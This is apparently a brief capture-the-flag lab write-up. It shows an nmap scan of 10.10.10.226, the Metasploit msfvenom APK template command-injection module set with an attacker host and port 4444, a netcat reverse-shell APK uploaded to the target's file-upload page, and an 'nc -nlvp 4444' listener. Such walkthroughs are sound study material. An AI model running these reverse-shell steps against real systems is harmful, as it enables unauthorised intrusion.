First we ran an nmap scan on the system:
```
nmap -sV -sC -T4 10.10.10.226
```
we found an open port 5000 and then browsed to the endpoint and found a website that allowed us to upload files.
using search sploit found out that msfconsole could be used to generate a payload that could exploit the machine

commands
```
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
set lhost <attacker ip>
set lport 4444
exploit
```
the exploit did not work with the python reverse shell so we switched to a netcat reverse  shell and it generated an apk file.
We then uploaded the file to the website and opened up a netcat listener ```nc -nlvp 4444```
